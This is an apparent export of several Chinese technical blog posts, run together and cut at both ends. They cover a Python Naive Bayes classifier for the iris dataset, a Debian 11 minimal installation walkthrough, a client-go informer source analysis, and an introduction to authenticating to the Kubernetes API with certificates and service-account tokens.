converge_probabilities(summaries, row): # 计算所有分类的个数 total_rows = sum([summaries[label][0][2] for label in summaries]) probabilities = dict() for class_value, class_summaries in summaries.items(): # 计算分类的概率，如这个分类在总分类里概率多少 # 公式中的P(class) probabilities[class_value] = summaries[class_value][0][2]/float(total_rows) # 通过公式 P(X1|class=0) * P(X2|class=0) * P(class=0) 计算高斯概率 for i in range(len(class_summaries)): mean, stdev, _ = class_summaries[i] probabilities[class_value] *= calculate_probability(row[i], mean, stdev) return probabilities # 通过计算出来的值，预测该花属于哪个品种，取高斯概率最大的值 def predict(summaries, row): probabilities = converge_probabilities(summaries, row) best_label, best_prob = None, -1 for class_value, probability in probabilities.items(): if best_label is None or probability \u0026gt; best_prob: best_prob = probability best_label = class_value return best_label # Naive Bayes Algorithm def naive_bayes(train, test): # 训练数据按照类分类排序 summarize = summarize_by_class(train) predictions = list() for row in test: output = predict(summarize, row) predictions.append(output) print(predictions) return(predictions) # 测试 if __name__ == '__main__': seed(1) filename = 'iris.csv' dataset = load_csv(filename) # 转换数值为float for i in range(len(dataset[0])-1): str_column_to_float(dataset, i) # 将类型转换为数字 str_column_to_int(dataset, len(dataset[0])-1) # 将数据分位测试数据和训练数据，folds为多少数据为训练数据 n_folds = 5 scores = evaluate_algorithm(dataset, naive_bayes, n_folds) print('Scores: %s' % scores) print('Mean Accuracy: %.3f%%' % (sum(scores)/float(len(scores)))) 可以看到运行结果，对鸢尾花数据集的预测正确率，平均为95.333%\n现在对 main 部分进行修改，使用全部数据集作为训练，新增记录作为预测\n# 按照整个数据集分类 model = summarize_by_class(dataset) # 新加一行预测数据 row = [5.3,3.9,3.2,2.3] # 根据训练集进行对数据预测 label = predict(model, row) print('Data=%s, Predicted: %s' % (row, label)) 完整修改过的代码如下：\nfrom csv import reader from random import seed from random import randrange from math import sqrt from math import exp from math import pi # 读取数据集 def load_csv(filename): dataset = list() with open(filename, 'r') as file: csv_reader = reader(file) for row in csv_reader: if not row: continue dataset.append(row) return dataset # 将每行的数字转换为float def str_column_to_float(dataset, column): for row in dataset: row[column] = float(row[column].strip()) # 将真实分类转换为数字，按照下标 def str_column_to_int(dataset, column): ''' :param dataset: list, 数据集 :param column: string，是为类型的列要传入 :return: None ''' # 通过循环拿到所有分类 class_values = [row[column] for row in dataset] # 对分类型去重 unique = set(class_values) lookup = dict() # 拿到分类值的key 下标 for i, value in enumerate(unique): lookup[value] = i # 增加一行，来显示下标和真实名称对应的数据 print(lookup) # 已对应的下标进行替换 for row in dataset: row[column] = lookup[row[column]] return lookup # 将数据的一部分作为训练数据 def cross_validation_split(dataset, n_folds): dataset_split = list() dataset_copy = list(dataset) fold_size = int(len(dataset) / n_folds) for _ in range(n_folds): fold = list() while len(fold) \u0026lt; fold_size: index = randrange(len(dataset_copy)) fold.append(dataset_copy.pop(index)) dataset_split.append(fold) return dataset_split # 计算准确度 def accuracy_metric(actual, predicted): correct = 0 for i in range(len(actual)): if actual[i] == predicted[i]: correct += 1 return correct / float(len(actual)) * 100.0 # 对算法数据进行评估 def evaluate_algorithm(dataset, algorithm, n_folds, *args): \u0026quot;\u0026quot;\u0026quot; :param dataset:list, 原始数据集 :param algorithm:function，算法函数 :param n_folds:int，取多少数据作为训练集 :param args:options ，参数 :return: None \u0026quot;\u0026quot;\u0026quot; folds = cross_validation_split(dataset, n_folds) scores = list() for fold in folds: train_set = list(folds) train_set.remove(fold) # 合并成一个数组 train_set = sum(train_set, []) test_set = list() for row in fold: row_copy = list(row) test_set.append(row_copy) row_copy[-1] = None # 将最后一个类型字段设置为None predicted = algorithm(train_set, test_set, *args) # 真实的类型 actual = [row[-1] for row in fold] # 精确的分数，即这一组数据正确率 accuracy = accuracy_metric(actual, predicted) scores.append(accuracy) print(scores) return scores # 按照分类拆分 def separate_by_class(dataset): \u0026quot;\u0026quot;\u0026quot; :param dataset:list, 按分类好的列表 :return: dict, 每个分类的每列（属性）的平均值，标准差，个数 \u0026quot;\u0026quot;\u0026quot; separated = dict() for i in range(len(dataset)): vector = dataset[i] class_value = vector[-1] if (class_value not in separated): separated[class_value] = list() separated[class_value].append(vector) return separated # 计算这一系列的平均值 def mean(numbers): return sum(numbers)/float(len(numbers)) # 计算一系列数字的标准差 def stdev(numbers): avg = mean(numbers) variance = sum([(x-avg)**2 for x in numbers]) / float(len(numbers)-1) return sqrt(variance) # 计算数据集中每列的平均值 标准差 长度 def summarize_dataset(dataset): summaries = [(mean(column), stdev(column), len(column)) for column in zip(*dataset)] del(summaries[-1]) return summaries # 按照分类划分数据集 def summarize_by_class(dataset): separated = separate_by_class(dataset) summaries = dict() for class_value, rows in separated.items(): summaries[class_value] = summarize_dataset(rows) return summaries # 计算x的高斯概率 def calculate_probability(x, mean, stdev): \u0026quot;\u0026quot;\u0026quot; :param x:float, 计算这个值的高斯概率 :param mean:float，x的平均值 :param stdev:float，x的标准差 :return: None \u0026quot;\u0026quot;\u0026quot; exponent = exp(-((x-mean)**2 / (2 * stdev**2 ))) return (1 / (sqrt(2 * pi) * stdev)) * exponent # 计算每行的概率 def converge_probabilities(summaries, row): # 计算所有分类的个数 total_rows = sum([summaries[label][0][2] for label in summaries]) probabilities = dict() for class_value, class_summaries in summaries.items(): # 计算分类的概率，如这个分类在总分类里概率多少 # 公式中的P(class) probabilities[class_value] = summaries[class_value][0][2]/float(total_rows) # 通过公式 P(X1|class=0) * P(X2|class=0) * P(class=0) 计算高斯概率 for i in range(len(class_summaries)): mean, stdev, _ = class_summaries[i] probabilities[class_value] *= calculate_probability(row[i], mean, stdev) return probabilities # 通过计算出来的值，预测该花属于哪个品种，取高斯概率最大的值 def predict(summaries, row): probabilities = converge_probabilities(summaries, row) best_label, best_prob = None, -1 for class_value, probability in probabilities.items(): if best_label is None or probability \u0026gt; best_prob: best_prob = probability best_label = class_value return best_label # Naive Bayes Algorithm def naive_bayes(train, test): # 训练数据按照类分类排序 summarize = summarize_by_class(train) predictions = list() for row in test: output = predict(summarize, row) predictions.append(output) print(predictions) return(predictions) # 测试 if __name__ == '__main__': seed(1) filename = 'iris.csv' dataset = load_csv(filename) # 转换数值为float for i in range(len(dataset[0])-1): str_column_to_float(dataset, i) # 将类型转换为数字 str_column_to_int(dataset, len(dataset[0])-1) # 按照整个数据集分类 model = summarize_by_class(dataset) # 新加一行预测数据 row = [5.3,3.9,3.2,2.3] # 根据训练集进行对数据预测 label = predict(model, row) print('Data=%s, Predicted: %s' % (row, label)) 可以看到对数据集 [5.3,3.9,3.2,2.3] 预测为 versicolor，那将属性修改为，[2.3,0.9,0.2,1.3] 预测结果为 setosa\nReference\ngaussian naive bayes\nNaive Bayes Example\ncaculator naive bayes\n五分钟了解朴素贝叶斯\nJoint Probability\nConditional Probability\n","permalink":"https://www.oomkill.com/2022/06/naive-bayes/","summary":"","title":"朴素贝叶斯算法"},{"content":"Preparation debian11几乎可以使用任何旧的计算机硬件，因为最小安装的要求非常低。以下是最低要求和推荐要求：\n最低要求 推荐要求 存储：10 Gigabytes\n内存：512 Megabytes\nCPU: 1 GigaHertz 存储：10 Gigabytes内存：2 GigabytesCPU: 1 GigaHertz or more Debian11 EOL：August 31st, 2026\n如何选择下载安装包 offical mirror aliyun mirror 官网提供了安装包的下载，其中CD是网络安装，DVD是离线安装\ndebian官方下载页面 Notes：CD安装包很小，下载下来是 debian-11.4.0-amd64-netinst.iso 如名所示，这是一个网络安装包，所以推荐下载DVD部分，可以达到离线安装的效果\n安装步骤 在界面中选择“Install”，安装将开始。如果图形化安装可以选择“Graphical install”，这里选择“Install”。\n欢迎页面 完成后，系统将提示选择安装时的“语言”。选择喜欢的语言，然后按“Enter”。这里选择英文\n选择语言页面 这将是接下来安装步骤\n安装步骤概述 选择位置与键盘布局 选择区域\n选择区域 下面部署时选择键盘布局：中国大陆使用的键盘布局是美国-英语，不要选择英国-英语之类，布局是不一样的，会存在按键输出的结果会不同\n选择键盘布局 完成上述操作后，将开始加载镜像。等待扫描完成。。。。\n等待扫描组件 设置主机名和域名 这步骤中将配置一个“主机名”。与一个“域”名称。\n配置主机名 “域” 可以选择留空确定\n配置域 完成上述操作后，安装程序将提示需要设置 root 密码。输入您的 root 密码，然后在重新输入以进行验证后继续。\n设置Root密码 设置非ROOT用户名、账户和密码 下一步创建一个非ROOT用户，这个步骤是必须的，并为这个新创建的帐户分配一个密码。以下截图将描述将如何完成此操作。\n配置普通用户 为这个用户配置密码\n为普通用户配置密码 为普通用户配置密码——二次确认 设置时钟时区 Eastern 美东时间\nCentral 北美中部\nMountain 北美山区时区\nPacific 太平洋时区\nAlaska 阿拉斯加夏令时间\nHawaii 夏威夷时区\nArizona 亞利桑时区\nEast Indiana 印第安纳时区\nSamoa 萨摩亚时间\n配置时区 对磁盘分区 此步骤磁盘进行分区。这里选择“手动”选项\n选择分区模式 选择手动进行划分为所需的分区。\n选择硬盘 创建新的分区表\n创建分区表 选择空闲的空间进行分区\n选择空闲空间 创建一个新分区\n创建一个新分区 为/boot划分分区\n为/boot划分分区 最终划分的分区 这里选No就行，提示是指不使用swap分区，No就是继续，Yes将返回分区页面\n对于swap分区的提示 创建新分区需要格式化，当前的分区将会被删除，如果是新磁盘选择Yes格式化分区\n确认格式化，进行分区 Base System安装 这里等待安装基础系统\n确认格式化，进行分区 几分钟后， 安装后会弹出一个界面，这里会扫描其他的media，这里因为没有，选择No就行。\n扫描其他媒介 离线安装 会扫描安装的媒介，这里也有提示，如果没有额外的媒介，可以跳过该步骤\n扫描其他媒介 配置网络镜像，建议配置下，如果不需要No即可\n配置网络镜像 接下来会弹出一个界面，请选择“Debian镜像国家”。这个是配置镜像地址的，选择自己的国家和镜像站即可\n选择镜像国家 这里选择的是中国和中科大镜像\n选择镜像地址 配置HTTP代理，不选择跳过\n配置http代理 如果选择网络安装，到这步骤时安装程序现在将在选择相关的。首先，选择离您所在国家最近的位置。Debian 镜像位置和域后检索剩余的文件\n这里提示有一个匿名调查，这里选No即可\n匿名调查 根据要求调整安装 在检索过程中，系统将提示需要自行选择以下预定义软件中的一个或多个。最小化安装仅选择基础系统与SSH即可\n安装组件选择 接下来等待安装即可\n安装过程 Notes：选择了DVD ISO将离线完成安装，如果使用了CD ISO，将从互联网上检索包并安装，这个时间将很长。\n其中会提示一个引导按章，直接Yes即可\n到了这里即将安装完成\n到了这里即将安装完成 完成Debian11最小化安装 看到到这里已经完成了安装，按“Continue”继续重启后即可\n完成安装 看到系统的引导界面 Enjoy 👏👏\n","permalink":"https://www.oomkill.com/2022/05/debian11-install-tutorial/","summary":"","title":"安装Debian11 (bullseye) Step-by-Step"},{"content":"之前了解了client-go中的架构设计，也就是 tools/cache 下面的一些概念，那么下面将对informer进行分析\nController 在client-go informer架构中存在一个 controller ，这个不是 Kubernetes 中的Controller组件；而是在 tools/cache 中的一个概念，controller 位于 informer 之下，Reflector 之上。code\nConfig 从严格意义上来讲，controller 是作为一个 sharedInformer 使用，通过接受一个 Config ，而 Reflector 则作为 controller 的 slot。Config 则包含了这个 controller 里所有的设置。\ntype Config struct { Queue // DeltaFIFO ListerWatcher // 用于list watch的 Process ProcessFunc // 定义如何从DeltaFIFO中弹出数据后处理的操作 ObjectType runtime.Object // Controller处理的对象数据，实际上就是kubernetes中的资源 FullResyncPeriod time.Duration // 全量同步的周期 ShouldResync ShouldResyncFunc // Reflector通过该标记来确定是否应该重新同步 RetryOnError bool } controller 然后 controller 又为 reflertor 的上层\ntype controller struct { config Config reflector *Reflector reflectorMutex sync.RWMutex clock clock.Clock } type Controller interface { // controller 主要做两件事， // 1. 构建并运行 Reflector,将listerwacther中的泵压到queue（Delta fifo）中 // 2. Queue用Pop()弹出数据，具体的操作是Process // 直到 stopCh 不阻塞，这两个协程将退出 Run(stopCh \u0026lt;-chan struct{}) HasSynced() bool // 这个实际上是从store中继承的，标记这个controller已经 LastSyncResourceVersion() string } controller 中的方法，仅有一个 Run() 和 New()；这意味着，controller 只是一个抽象的概念，作为 Reflector, Delta FIFO 整合的工作流\n而 controller 则是 SharedInformer 了。\nQueue 这里的 queue 可以理解为是一个具有 Pop() 功能的 Indexer ;而 Pop() 的功能则是 controller 中的一部分；也就是说 queue 是一个扩展的 Store ， Store 是不具备弹出功能的。\ntype Queue interface { Store // Pop会阻塞等待，直到有内容弹出，删除对应的值并处理计数器 Pop(PopProcessFunc) (interface{}, error) // AddIfNotPresent puts the given accumulator into the Queue (in // association with the accumulator's key) if and only if that key // is not already associated with a non-empty accumulator. AddIfNotPresent(interface{}) error // HasSynced returns true if the first batch of keys have all been // popped. The first batch of keys are those of the first Replace // operation if that happened before any Add, Update, or Delete; // otherwise the first batch is empty. HasSynced() bool Close() // 关闭queue } 而弹出的操作是通过 controller 中的 processLoop() 进行的，最终走到Delta FIFO中进行处理。\n通过忙等待去读取要弹出的数据，然后在弹出前 通过PopProcessFunc 进行处理\nfunc (c *controller) processLoop() { for { obj, err := c.config.Queue.Pop(PopProcessFunc(c.config.Process)) if err != nil { if err == ErrFIFOClosed { return } if c.config.RetryOnError { // This is the safe way to re-enqueue. c.config.Queue.AddIfNotPresent(obj) } } } } DeltaFIFO.Pop()\nfunc (f *DeltaFIFO) Pop(process PopProcessFunc) (interface{}, error) { f.lock.Lock() defer f.lock.Unlock() for { for len(f.queue) == 0 { // When the queue is empty, invocation of Pop() is blocked until new item is enqueued. // When Close() is called, the f.closed is set and the condition is broadcasted. // Which causes this loop to continue and return from the Pop(). if f.IsClosed() { return nil, ErrFIFOClosed } f.cond.Wait() } id := f.queue[0] f.queue = f.queue[1:] if f.initialPopulationCount \u0026gt; 0 { f.initialPopulationCount-- } item, ok := f.items[id] if !ok { // Item may have been deleted subsequently. continue } delete(f.items, id) err := process(item) // 进行处理 if e, ok := err.(ErrRequeue); ok { f.addIfNotPresent(id, item) // 如果失败，再重新加入到队列中 err = e.Err } // Don't need to copyDeltas here, because we're transferring // ownership to the caller. return item, err } } Informer 通过对 Reflector, Store, Queue, ListerWatcher、ProcessFunc, 等的概念，发现由 controller 所包装的起的功能并不能完成通过对API的动作监听，并通过动作来处理本地缓存的一个能力；这个情况下诞生了 informer 严格意义上来讲是 sharedInformer\nfunc newInformer( lw ListerWatcher, objType runtime.Object, resyncPeriod time.Duration, h ResourceEventHandler, clientState Store, ) Controller { // This will hold incoming changes. Note how we pass clientState in as a // KeyLister, that way resync operations will result in the correct set // of update/delete deltas. fifo := NewDeltaFIFOWithOptions(DeltaFIFOOptions{ KnownObjects: clientState, EmitDeltaTypeReplaced: true, }) cfg := \u0026amp;Config{ Queue: fifo, ListerWatcher: lw, ObjectType: objType, FullResyncPeriod: resyncPeriod, RetryOnError: false, Process: func(obj interface{}) error { // from oldest to newest for _, d := range obj.(Deltas) { switch d.Type { case Sync, Replaced, Added, Updated: if old, exists, err := clientState.Get(d.Object); err == nil \u0026amp;\u0026amp; exists { if err := clientState.Update(d.Object); err != nil { return err } h.OnUpdate(old, d.Object) } else { if err := clientState.Add(d.Object); err != nil { return err } h.OnAdd(d.Object) } case Deleted: if err := clientState.Delete(d.Object); err != nil { return err } h.OnDelete(d.Object) } } return nil }, } return New(cfg) } newInformer是位于 tools/cache/controller.go 下，可以看出，这里面并没有informer的概念，这里通过注释可以看到，newInformer实际上是一个提供了存储和事件通知的informer。他关联的 queue 则是 Delta FIFO，并包含了 ProcessFunc, Store 等 controller的概念。最终对外的方法为 NewInformer()\nfunc NewInformer( lw ListerWatcher, objType runtime.Object, resyncPeriod time.Duration, h ResourceEventHandler, ) (Store, Controller) { // This will hold the client state, as we know it. clientState := NewStore(DeletionHandlingMetaNamespaceKeyFunc) return clientState, newInformer(lw, objType, resyncPeriod, h, clientState) } type ResourceEventHandler interface { OnAdd(obj interface{}) OnUpdate(oldObj, newObj interface{}) OnDelete(obj interface{}) } 可以看到 NewInformer() 就是一个带有 Store功能的controller，通过这些可以假定出，Informer 就是controller ，将queue中相关操作分发给不同事件处理的功能\nSharedIndexInformer shareInformer 为客户端提供了与apiserver一致的数据对象本地缓存，并支持多事件处理程序的informer，而 shareIndexInformer 则是对shareInformer 的扩展\ntype SharedInformer interface { // AddEventHandler adds an event handler to the shared informer using the shared informer's resync // period. Events to a single handler are delivered sequentially, but there is no coordination // between different handlers. AddEventHandler(handler ResourceEventHandler) // AddEventHandlerWithResyncPeriod adds an event handler to the // shared informer with the requested resync period; zero means // this handler does not care about resyncs. The resync operation // consists of delivering to the handler an update notification // for every object in the informer's local cache; it does not add // any interactions with the authoritative storage. Some // informers do no resyncs at all, not even for handlers added // with a non-zero resyncPeriod. For an informer that does // resyncs, and for each handler that requests resyncs, that // informer develops a nominal resync period that is no shorter // than the requested period but may be longer. The actual time // between any two resyncs may be longer than the nominal period // because the implementation takes time to do work and there may // be competing load and scheduling noise. AddEventHandlerWithResyncPeriod(handler ResourceEventHandler, resyncPeriod time.Duration) // GetStore returns the informer's local cache as a Store. GetStore() Store // GetController is deprecated, it does nothing useful GetController() Controller // Run starts and runs the shared informer, returning after it stops. // The informer will be stopped when stopCh is closed. Run(stopCh \u0026lt;-chan struct{}) // HasSynced returns true if the shared informer's store has been // informed by at least one full LIST of the authoritative state // of the informer's object collection. This is unrelated to \u0026quot;resync\u0026quot;. HasSynced() bool // LastSyncResourceVersion is the resource version observed when last synced with the underlying // store. The value returned is not synchronized with access to the underlying store and is not // thread-safe. LastSyncResourceVersion() string } SharedIndexInformer 是对SharedInformer的实现，可以从结构中看出，SharedIndexInformer 大致具有如下功能：\n索引本地缓存 controller，通过list watch拉取API并推入 Deltal FIFO 事件的处理 type sharedIndexInformer struct { indexer Indexer // 具有索引的本地缓存 controller Controller // controller processor *sharedProcessor // 事件处理函数集合 cacheMutationDetector MutationDetector listerWatcher ListerWatcher objectType runtime.Object resyncCheckPeriod time.Duration defaultEventHandlerResyncPeriod time.Duration clock clock.Clock started, stopped bool startedLock sync.Mutex blockDeltas sync.Mutex } 而在 tools/cache/share_informer.go 可以看到 shareIndexInformer 的运行过程\nfunc (s *sharedIndexInformer) Run(stopCh \u0026lt;-chan struct{}) { defer utilruntime.HandleCrash() fifo := NewDeltaFIFOWithOptions(DeltaFIFOOptions{ KnownObjects: s.indexer, EmitDeltaTypeReplaced: true, }) cfg := \u0026amp;Config{ Queue: fifo, ListerWatcher: s.listerWatcher, ObjectType: s.objectType, FullResyncPeriod: s.resyncCheckPeriod, RetryOnError: false, ShouldResync: s.processor.shouldResync, Process: s.HandleDeltas, // process 弹出时操作的流程 } func() { s.startedLock.Lock() defer s.startedLock.Unlock() s.controller = New(cfg) s.controller.(*controller).clock = s.clock s.started = true }() // Separate stop channel because Processor should be stopped strictly after controller processorStopCh := make(chan struct{}) var wg wait.Group defer wg.Wait() // Wait for Processor to stop defer close(processorStopCh) // Tell Processor to stop wg.StartWithChannel(processorStopCh, s.cacheMutationDetector.Run) wg.StartWithChannel(processorStopCh, s.processor.run) // 启动事件处理函数 defer func() { s.startedLock.Lock() defer s.startedLock.Unlock() s.stopped = true // Don't want any new listeners }() s.controller.Run(stopCh) // 启动controller，controller会启动Reflector和fifo的Pop() } 而在操作Delta FIFO中可以看到，做具体操作时，会将动作分发至对应的事件处理函数中，这个是informer初始化时对事件操作的函数\nfunc (s *sharedIndexInformer) HandleDeltas(obj interface{}) error { s.blockDeltas.Lock() defer s.blockDeltas.Unlock() for _, d := range obj.(Deltas) { switch d.Type { case Sync, Replaced, Added, Updated: s.cacheMutationDetector.AddObject(d.Object) if old, exists, err := s.indexer.Get(d.Object); err == nil \u0026amp;\u0026amp; exists { if err := s.indexer.Update(d.Object); err != nil { return err } isSync := false switch { case d.Type == Sync: isSync = true case d.Type == Replaced: if accessor, err := meta.Accessor(d.Object); err == nil { if oldAccessor, err := meta.Accessor(old); err == nil { isSync = accessor.GetResourceVersion() == oldAccessor.GetResourceVersion() } } } // 事件的分发 s.processor.distribute(updateNotification{oldObj: old, newObj: d.Object}, isSync) } else { if err := s.indexer.Add(d.Object); err != nil { return err } // 事件的分发 s.processor.distribute(addNotification{newObj: d.Object}, false) } case Deleted: if err := s.indexer.Delete(d.Object); err != nil { return err } s.processor.distribute(deleteNotification{oldObj: d.Object}, false) } } return nil } 事件处理函数 processor 启动informer时也会启动注册进来的事件处理函数；processor 就是这个事件处理函数。\nrun() 函数会启动两个 listener，j监听事件处理业务函数 listener.run 和 事件的处理\nwg.StartWithChannel(processorStopCh, s.processor.run) func (p *sharedProcessor) run(stopCh \u0026lt;-chan struct{}) { func() { p.listenersLock.RLock() defer p.listenersLock.RUnlock() for _, listener := range p.listeners { p.wg.Start(listener.run) p.wg.Start(listener.pop) } p.listenersStarted = true }() \u0026lt;-stopCh p.listenersLock.RLock() defer p.listenersLock.RUnlock() for _, listener := range p.listeners { close(listener.addCh) // Tell .pop() to stop. .pop() will tell .run() to stop } p.wg.Wait() // Wait for all .pop() and .run() to stop } 可以看出，就是拿到的事件，根据注册的到informer的事件函数进行处理\nfunc (p *processorListener) run() { stopCh := make(chan struct{}) wait.Until(func() { for next := range p.nextCh { // 消费事件 switch notification := next.(type) { case updateNotification: p.handler.OnUpdate(notification.oldObj, notification.newObj) case addNotification: p.handler.OnAdd(notification.newObj) case deleteNotification: p.handler.OnDelete(notification.oldObj) default: utilruntime.HandleError(fmt.Errorf(\u0026quot;unrecognized notification: %T\u0026quot;, next)) } } // the only way to get here is if the p.nextCh is empty and closed close(stopCh) }, 1*time.Second, stopCh) } informer中的事件的设计 了解了informer如何处理事件，就需要学习下，informer的事件系统设计 prossorListener\n事件的添加 当在handleDelta时，会分发具体的事件\n// 事件的分发 s.processor.distribute(updateNotification{oldObj: old, newObj: d.Object}, isSync) 此时，事件泵 Pop() 会根据接收到的事件进行处理\n// run() 时会启动一个事件泵 p.wg.Start(listener.pop) func (p *processorListener) pop() { defer utilruntime.HandleCrash() defer close(p.nextCh) var nextCh chan\u0026lt;- interface{} var notification interface{} for { select { case nextCh \u0026lt;- notification: // 这里实际上是一个阻塞的等待 // 单向channel 可能不会走到这步骤 var ok bool // deltahandle 中 distribute 会将事件添加到addCh待处理事件中 // 处理完事件会再次拿到一个事件 notification, ok = p.pendingNotifications.ReadOne() if !ok { // Nothing to pop nextCh = nil // Disable this select case } // 处理 分发过来的事件 addCh case notificationToAdd, ok := \u0026lt;-p.addCh: // distribute分发的事件 if !ok { return } // 这里代表第一次，没有任何事件时，或者上面步骤完成读取 if notification == nil { // 就会走这里 notification = notificationToAdd nextCh = p.nextCh } else { // notification否则代表没有处理完，将数据再次添加到待处理中 p.pendingNotifications.WriteOne(notificationToAdd) } } } } 该消息事件的流程图为\n通过一个简单实例来学习client-go中的消息通知机制\npackage main import ( \u0026quot;fmt\u0026quot; \u0026quot;time\u0026quot; \u0026quot;k8s.io/utils/buffer\u0026quot; ) var nextCh1 = make(chan interface{}) var addCh = make(chan interface{}) var stopper = make(chan struct{}) var notification interface{} var pendding = *buffer.NewRingGrowing(2) func main() { // pop go func() { var nextCh chan\u0026lt;- interface{} var notification interface{} //var n int for { fmt.Println(\u0026quot;busy wait\u0026quot;) fmt.Println(\u0026quot;entry select\u0026quot;, notification) select { // 初始时，一个未初始化的channel，nil，形成一个阻塞（单channel下是死锁） case nextCh \u0026lt;- notification: fmt.Println(\u0026quot;entry nextCh\u0026quot;, notification) var ok bool // 读不到数据代表已处理完，置空锁 notification, ok = pendding.ReadOne() if !ok { fmt.Println(\u0026quot;unactive nextch\u0026quot;) nextCh = nil } // 事件的分发，监听，初始时也是一个阻塞 case notificationToAdd, ok := \u0026lt;-addCh: fmt.Println(notificationToAdd, notification) if !ok { return } // 线程安全 // 当消息为空时，没有被处理 // 锁为空，就分发数据 if notification == nil { fmt.Println(\u0026quot;frist notification nil\u0026quot;) notification = notificationToAdd nextCh = nextCh1 // 这步骤等于初始化了局部的nextCh，会触发上面的流程 } else { // 在第三次时，会走到这里，数据进入环 fmt.Println(\u0026quot;into ring\u0026quot;, notificationToAdd) pendding.WriteOne(notificationToAdd) } } } }() // producer go func() { i := 0 for { i++ if i%5 == 0 { addCh \u0026lt;- fmt.Sprintf(\u0026quot;thread 2 inner -- %d\u0026quot;, i) time.Sleep(time.Millisecond * 9000) } else { addCh \u0026lt;- fmt.Sprintf(\u0026quot;thread 2 outer -- %d\u0026quot;, i) time.Sleep(time.Millisecond * 500) } } }() // subsriber go func() { for { for next := range nextCh1 { time.Sleep(time.Millisecond * 300) fmt.Println(\u0026quot;consumer\u0026quot;, next) } } }() \u0026lt;-stopper } 总结，这里的机制类似于线程安全，进入临界区的一些算法，临界区就是 nextCh，notification 就是保证了至少有一个进程可以进入临界区（要么分发事件，要么生产事件）；nextCh 和 nextCh1 一个是局部管道一个是全局的，管道未初始化代表了死锁（阻塞）；当有消息要处理时，会将局部管道 nextCh 赋值给 全局 nextCh1 此时相当于解除了分发的步骤（对管道赋值，触发分发操作）；ringbuffer 实际上是提供了一个对 notification 加锁的操作，在没有处理的消息时，需要保障 notification 为空，同时也关闭了流程 nextCh 的写入。这里主要是考虑对golang中channel的用法\n","permalink":"https://www.oomkill.com/2022/05/ch08-informer/","summary":"","title":"源码分析client-go架构 - 什么是informer"},{"content":"Prepare Introduction 从2016年8月起，Kubernetes官方提取了与Kubernetes相关的核心源代码，形成了一个独立的项目，即client-go，作为官方提供的go客户端。Kubernetes的部分代码也是基于这个项目的。\nclient-go 是kubernetes中广义的客户端基础库，在Kubernetes各个组件中或多或少都有使用其功能。。也就是说，client-go可以在kubernetes集群中添加、删除和查询资源对象（包括deployment、service、pod、ns等）。\n在了解client-go前，还需要掌握一些概念\n在客户端验证 API 使用证书和使用令牌，来验证客户端 kubernetes集群的访问模式 使用证书和令牌来验证客户端 在访问apiserver时，会对访问者进行鉴权，因为是https请求，在请求时是需要ca的，也可以使用 -k 使用insecure模式\n$ curl --cacert /etc/kubernetes/pki/ca.crt https://10.0.0.4:6443/version\r\\{\r\u0026quot;major\u0026quot;: \u0026quot;1\u0026quot;,\r\u0026quot;minor\u0026quot;: \u0026quot;18+\u0026quot;,\r\u0026quot;gitVersion\u0026quot;: \u0026quot;v1.18.20-dirty\u0026quot;,\r\u0026quot;gitCommit\u0026quot;: \u0026quot;1f3e19b7beb1cc0110255668c4238ed63dadb7ad\u0026quot;,\r\u0026quot;gitTreeState\u0026quot;: \u0026quot;dirty\u0026quot;,\r\u0026quot;buildDate\u0026quot;: \u0026quot;2022-05-17T12:45:14Z\u0026quot;,\r\u0026quot;goVersion\u0026quot;: \u0026quot;go1.16.15\u0026quot;,\r\u0026quot;compiler\u0026quot;: \u0026quot;gc\u0026quot;,\r\u0026quot;platform\u0026quot;: \u0026quot;linux/amd64\u0026quot;\r}\r$ curl -k https://10.0.0.4:6443/api/v1/namespace/default/pods/netbox\r{\r\u0026quot;kind\u0026quot;: \u0026quot;Status\u0026quot;,\r\u0026quot;apiVersion\u0026quot;: \u0026quot;v1\u0026quot;,\r\u0026quot;metadata\u0026quot;: {\r},\r\u0026quot;status\u0026quot;: \u0026quot;Failure\u0026quot;,\r\u0026quot;message\u0026quot;: \u0026quot;namespace \\\u0026quot;default\\\u0026quot; is forbidden: User \\\u0026quot;system:anonymous\\\u0026quot; cannot get resource \\\u0026quot;namespace/pods\\\u0026quot; in API group \\\u0026quot;\\\u0026quot; at the cluster scope\u0026quot;,\r\u0026quot;reason\u0026quot;: \u0026quot;Forbidden\u0026quot;,\r\u0026quot;details\u0026quot;: {\r\u0026quot;name\u0026quot;: \u0026quot;default\u0026quot;,\r\u0026quot;kind\u0026quot;: \u0026quot;namespace\u0026quot;\r},\r\u0026quot;code\u0026quot;: 403\r}\r从错误中可以看出，该请求已通过身份验证，用户是 system:anonymous，但该用户未授权列出对应的资源。而上述请求只是忽略 curl 的https请求需要做的验证，而Kubernetes也有对应验证的机制，这个时候需要提供额外的身份信息来获得所需的访问权限。Kubernetes支持多种身份认证机制，ssl证书也是其中一种。\n注：在Kubernetes中没有表示用户的资源。即kubernetes集群中，无法添加和创建。但由集群提供的有效证书的用户都视为允许的用户。Kubernetes从证书中的使用者CN和使用者可选名称中获得用户；然后，RBAC 判断用户是否有权限操作资源。从 Kubernetes1.4 开始，支持用户组，即证书中的O\n可以使用 curl 的 --cert 和 --key 指定用户的证书\ncurl --cacert /etc/kubernetes/pki/ca.crt \\\r--cert /etc/kubernetes/pki/apiserver-kubelet-client.crt \\\r--key /etc/kubernetes/pki/apiserver-ubelet-client.key \\\rhttps://10.0.0.4:6443/api/v1/namespaces/default/pods/netbox\r使用serviceaccount验证客户端身份 使用一个serviceaccount JWT，获取一个SA的方式如下\nkubectl get secrets \\\r$(kubectl get serviceaccounts/default -o jsonpath='{.secrets[0].name}') -o jsonpath='{.data.token}' \\\r| base64 --decode\rJWT=$(kubectl get secrets \\\r$(kubectl get serviceaccounts/default -o jsonpath='{.secrets[0].name}') -o jsonpath='{.data.token}' \\\r| base64 --decode)\r使用secret来访问API\ncurl --cacert /etc/kubernetes/pki/ca.crt \\\r--header \u0026quot;Authorization: Bearer $JWT\u0026quot; \\\rhttps://10.0.0.4:6443/apis/apps/v1/namespaces/default/deployments\rPod内部调用Kubernetes API kubernete会将Kubernetes API地址通过环境变量提供给 Pod，可以通过命令看到\n$ env|grep -i kuber\rKUBERNETES_SERVICE_PORT=443\rKUBERNETES_PORT=tcp://192.168.0.1:443\rKUBERNETES_PORT_443_TCP_ADDR=192.168.0.1\rKUBERNETES_PORT_443_TCP_PORT=443\rKUBERNETES_PORT_443_TCP_PROTO=tcp\rKUBERNETES_PORT_443_TCP=tcp://192.168.0.1:443\rKUBERNETES_SERVICE_PORT_HTTPS=443\rKUBERNETES_SERVICE_HOST=192.168.0.1\r并且还会在将 Kubernetes CA和SA等信息放置在目录 